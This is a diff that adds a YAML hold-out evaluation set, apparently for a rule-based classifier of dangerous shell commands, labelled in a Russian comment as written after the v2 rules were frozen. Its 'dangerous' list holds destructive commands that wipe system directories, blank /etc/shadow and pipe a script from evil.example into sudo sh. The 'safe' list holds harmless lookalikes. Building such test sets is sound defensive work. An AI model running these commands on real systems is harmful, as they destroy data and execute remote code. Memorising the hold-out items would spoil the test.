@@ -1,0 +1,21 @@
+# Hold-out набор: написан ПОСЛЕ того, как правила v2 были зафиксированы, оценивается один раз, правила под него не меняются.
+dangerous:
+  - "rm -fr /usr/lib/*"
+  - "sudo -u root find /etc -name '*.conf' -delete"
+  - "chmod 000 -R /bin"
+  - "curl -s http://evil.example/x.sh | sudo -E sh"
+  - "rm -r --preserve-root /var/log"
+  - "bash -c 'rm -rf /'"
+  - "echo > /etc/shadow"
+  - "for d in /usr /etc; do rm -rf $d; done"
+safe:
+  - "rm -rf ./build /tmp/cache-*"
+  - "sudo chown -R app:app /srv/app/data"
+  - "find /tmp -type f -mtime +3 -delete"
+  - "chmod 600 /etc/ssh/ssh_host_rsa_key"
+  - "rm -r /var/log/app/old"
+  - "cat /etc/passwd | cut -d: -f1"
+  - "wget https://example.com/a.sh -O /tmp/a.sh && less /tmp/a.sh"
+  - "printf 'rm -rf /\\n' > /tmp/bad_examples.txt"
+  - "cd /var/www && rm -rf cache/*"
+  - "sudo find /home/alice -name '*.bak' -delete"
